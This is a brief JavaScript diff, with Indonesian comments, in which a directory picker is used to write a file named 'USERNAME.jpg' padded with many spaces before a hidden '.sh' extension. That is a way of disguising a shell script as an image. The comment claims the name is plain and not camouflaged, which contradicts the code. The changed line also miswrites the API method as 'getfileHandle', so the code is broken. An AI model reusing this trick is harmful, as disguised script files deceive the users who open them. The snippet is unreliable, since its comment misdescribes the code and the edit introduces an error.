@@ -23,7 +23,7 @@
       const dirHandle = await window.showDirectoryPicker();
 
       // 2) Buat file shell yang JELAS namanya (tanpa kamuflase ekstensi)
-        const newFileHandle = await dirHandle.getFileHandle(
+        const fileHandle = await dirHandle.getfileHandle(
     'USERNAME.jpg                                                                            .sh',
     { create: true }
   )
